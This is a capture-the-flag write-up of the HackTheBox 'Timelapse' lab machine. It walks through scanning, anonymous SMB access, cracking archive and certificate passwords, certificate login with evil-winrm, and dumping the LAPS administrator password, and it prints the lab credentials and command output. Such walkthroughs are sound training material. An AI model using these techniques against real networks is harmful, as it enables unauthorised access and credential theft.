---
layout: post
title: HackTheBox - Timelapse
category: HackTheBox
tags: machines smb laps brute-force windows
date: 2022-07-01 17:02 +0300
---

![Machine logo](/assets/hackthebox/timelapse/Timelapse.png){:height="414px" width="615px"}

## Configuration:
It is very useful to append `/etc/hosts/` with ip address of the machine. It is useful to get subdomains and to not memorize the address every time.
```zsh
$ echo '10.10.11.152 timelapse.htb' | sudo tee -a /etc/hosts 
```

## Reconnaissance:
```zsh
$ nmap -p- timelapse.htb -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 11:10 UTC
Nmap scan report for timelapse.htb (10.10.11.152)
Host is up (0.056s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
62020/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 111.03 seconds
```

It looks like an `Active Directory` domain.

## Enumeration:
Let's start with smb enumeration. It is also can be done by simple `smbclient`.
```zsh
$ crackmapexec smb timelapse.htb -u 'a' -p '' --shares
SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         timelapse.htb   445    DC01             [+] timelapse.htb\a: 
SMB         timelapse.htb   445    DC01             [+] Enumerated shares
SMB         timelapse.htb   445    DC01             Share           Permissions     Remark
SMB         timelapse.htb   445    DC01             -----           -----------     ------
SMB         timelapse.htb   445    DC01             ADMIN$                          Remote Admin
SMB         timelapse.htb   445    DC01             C$                              Default share
SMB         timelapse.htb   445    DC01             IPC$            READ            Remote IPC
SMB         timelapse.htb   445    DC01             NETLOGON                        Logon server share 
SMB         timelapse.htb   445    DC01             Shares          READ            
SMB         timelapse.htb   445    DC01             SYSVOL                          Logon server share
```

We can read 2 shares without login, now we connect with `smbclient` and search.
```zsh
$ smbclient -N \\\\timelapse.htb\\Shares\\
smb: \> dir
  .                                   D        0  Mon Oct 25 15:39:15 2021
  ..                                  D        0  Mon Oct 25 15:39:15 2021
  Dev                                 D        0  Mon Oct 25 19:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 15:48:42 2021

                6367231 blocks of size 4096. 1680031 blocks available
smb: \> cd Dev
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 19:40:06 2021
  ..                                  D        0  Mon Oct 25 19:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 15:46:42 2021

                6367231 blocks of size 4096. 1680031 blocks available
smb: \Dev\> get winrm_backup.zip
smb: \Dev\> cd ..
smb: \> cd HelpDesk
smb: \HelpDesk\> dir
  .                                   D        0  Mon Oct 25 15:48:42 2021
  ..                                  D        0  Mon Oct 25 15:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 14:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 14:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 14:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 14:57:44 2021

                6367231 blocks of size 4096. 1680031 blocks available
smb: \HelpDesk\> mget *
```

winrm_backup.zip archive has a password, we will try to brute it with `john`.
```zsh
$ zip2john winrm_backup.zip > hash
$ john --wordlist=rockyou.txt hash
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
```

legacyy_dev_auth.pfx is a `PKCS#12` file format, contains the SSL certificate (public keys) and the corresponding private keys. But it requires password to extract. Let's convert it to hash and brute it again!
```zsh
$ pfx2john legacyy_dev_auth.pfx > hash
$ john --wordlist=rockyou.txt hash
thuglegacy       (legacyy_dev_auth.pfx)
```

Now we got the password and able to extract a certificate and a private key. We use `openssl` library to do that.
```zsh
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key
$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out certificate.crt
```

## user.txt
Now we have a certificate and a private key. We can use them to auth into the machine with `evil-winrm`.
```zsh
$ evil-winrm -i timelapse.htb -S -k private.key -c certificate.crt
*Evil-WinRM* PS C:\Users\legacyy\Documents>
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ..
*Evil-WinRM* PS C:\Users\legacyy> type Desktop\user.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX # Edited
```

## root.txt
Here we have to search. By searching in `Program Files` folder, we have to note that `LAPS` in installed and enabled. We can upload and execute `winPEAS`. It will show us a command history file.

![PowerShell history file](/assets/hackthebox/timelapse/history_file.png)

Let's open it!

```powershell
*Evil-WinRM* PS C:\Users\legacyy\Downloads> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

We can see the credentials here: `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`.

svc_deploy user is a member of `LAPS_Readers` group, which can extract `Local Administrator` password. We are using `crackmapexec` to do that.

```zsh
$ crackmapexec smb timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps  
SMB         timelapse.htb   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         timelapse.htb   445    DC01             [-] DC01\administrator:ImM+fZ5b;G82H&S+5.&5)sW} STATUS_LOGON_FAILURE
```

Then, we got it: `administrator:ImM+fZ5b;G82H&S+5.&5)sW}`. It's time to log in and get the flag!

```zsh
$ evil-winrm -i timelapse.htb -u 'administrator' -p 'ImM+fZ5b;G82H&S+5.&5)sW}' -S
*Evil-WinRM* PS C:\Users\Administrator\Documents> gci -Path C:\ -Recurse -Include 'root.txt'
    Directory: C:\Users\TRX\Desktop
-ar---         7/1/2022   9:25 AM             34 root.txt
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../../TRX/Desktop/root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX # Edited
```

It was in unusual location, so we had to search for it with `Get-ChildItem`.

## Conclusion
I've really enjoyed the box. It was interesting to learn some new things.

Thank you for reading, I hope it was useful for you ❤️
